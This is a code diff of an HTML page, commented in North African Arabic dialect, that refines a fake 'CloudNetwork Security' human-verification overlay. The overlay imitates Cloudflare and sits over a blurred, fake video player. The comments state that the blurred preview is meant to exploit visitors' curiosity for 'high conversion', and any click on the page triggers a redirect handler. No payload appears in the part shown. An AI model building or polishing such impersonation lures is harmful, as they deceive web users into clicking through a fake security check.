@@ -16,38 +16,78 @@
         }
         
         html, body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", Arial, sans-serif;
-            background-color: #f7f7f9;
-            color: #2c2c2e;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+            background-color: #0b0b0c; /* Badalna l-background l-ghma9 bsh tban dynamic professional */
+            color: #ffffff;
             height: 100vh;
             overflow: hidden;
-            cursor: default !important; /* Forced Mouthalth Arrow */
+            cursor: default !important;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
 
-        /* 🎯 A9WA FODOUL TRIGGER BACKGROUND (BLURRED CONTENT) 🎯 */
-        .premium-content-blur {
+        /* 🎯 HIGH-CONVERSION VISUAL BACKGROUND (DYNAMIC VIDEO PLAYER PREVIEW) 🎯 */
+        .video-preview-container {
+            position: absolute;
+            top: 0;
+            left: 0;
             width: 100%;
-            max-width: 800px;
-            margin: 40px auto;
-            padding: 30px;
-            text-align: center;
-            filter: blur(8px); /* Hna l-faza! L-content yban mkhabbi bsh y-loadi l-fodoul */
-            opacity: 0.18;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 1;
             user-select: none;
             pointer-events: none;
         }
-        .content-card {
-            background: #fff;
-            border: 1px solid #e5e5ea;
-            border-radius: 12px;
-            padding: 40px;
-        }
-        .fake-media-box {
+
+        /* Blurred background image layer */
+        .blurred-bg-image {
+            position: absolute;
             width: 100%;
-            height: 250px;
-            background: #e5e5ea;
-            border-radius: 8px;
-            margin: 20px 0;
+            height: 100%;
+            background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url('https://picsum.photos/1920/1080?blur=10') no-repeat center center;
+            background-size: cover;
+            filter: blur(12px); /* Blurred dynamically bsh y7arrek l-fodoul */
+            opacity: 0.6;
+            z-index: 2;
+        }
+
+        /* Real-looking elements above the blur to catch attention */
+        .player-hud {
+            position: relative;
+            z-index: 3;
+            text-align: center;
+            opacity: 0.4; /* Khfifa kineha blockée wra l-cloud overlay */
+        }
+
+        .play-button-fake {
+            width: 80px;
+            height: 80px;
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 50%;
+            margin: 0 auto 20px auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+        }
+        .play-icon {
+            width: 0;
+            height: 0;
+            border-top: 15px solid transparent;
+            border-bottom: 15px solid transparent;
+            border-left: 25px solid #1c1c1e;
+            margin-left: 6px;
+        }
+
+        .hud-text {
+            font-size: 18px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            text-shadow: 0 2px 8px rgba(0,0,0,0.8);
         }
 
         /* Modern Cloudflare Overlay Box */
@@ -57,8 +97,8 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.4);
-            backdrop-filter: blur(5px);
+            background: rgba(0, 0, 0, 0.55);
+            backdrop-filter: blur(4px);
             display: flex;
             align-items: center;
             justify-content: center;
@@ -69,13 +109,13 @@
         .modal-box {
             background: #ffffff;
             border-radius: 14px;
-            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.15);
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.3);
             width: 90%;
             max-width: 420px;
             position: relative;
             text-align: left;
             overflow: hidden;
-            border: 1px solid rgba(0, 0, 0, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
             padding: 28px;
             animation: slideUp 0.35s cubic-bezier(0.16, 1, 0.3, 1);
             cursor: default !important;
@@ -124,7 +164,7 @@
             justify-content: space-between;
             width: 100%;
             user-select: none;
-            cursor: pointer !important; /* Pointer yed kan hna */
+            cursor: pointer !important;
         }
         .widget-left {
             display: flex;
@@ -163,13 +203,14 @@
 </head>
 <body onclick="handleGlobalClick(event)">
 
-<!-- 🎯 BLURRED HIDDEN BACKGROUND TARGETING USER CURIOSITY 🎯 -->
-<div class="premium-content-blur">
-    <div class="content-card">
-        <h2>[CONFIRMED FILE] Premium Download Link & Media Player</h2>
-        <p>File Size: 142.8 MB | Status: Available for Instant Access</p>
-        <div class="fake-media-box"></div>
-        <p>Loading full high-definition content stream data nodes...</p>
+<!-- 🎯 REAL VISUAL PREVIEW GENERATED IN BACKGROUND 🎯 -->
+<div class="video-preview-container">
+    <div class="blurred-bg-image"></div>
+    <div class="player-hud">
+        <div class="play-button-fake">
+            <div class="play-icon"></div>
+        </div>
+        <div class="hud-text">Loading High-Definition Stream... (720p/1080p)</div>
     </div>
 </div>
 
@@ -182,7 +223,7 @@
             <div class="modal-title">CloudNetwork Security</div>
         </div>
         
-        <!-- High Trust Text -->
+        <!-- Verification Text -->
         <div class="modal-text">
             Please help us keeping our community safe by checking the security box below to verify you are a human browser.
         </div>
@@ -205,7 +246,7 @@
 <script>
     var isClicked = false;
     
-    // ⚠️ CHOUNDH EL-LINK L-S7I9A HNA (REAL MANCHOUR OR CONTENT) ⚠️
+    // ⚠️ CHOUNDH EL-LINK L-S7I9A HNA (REAL CONTENT OR VIDEO PAGE) ⚠️
     var realContentUrl = "https://example.com/your-real-article-link"; 
 
     function handleGlobalClick(e) {
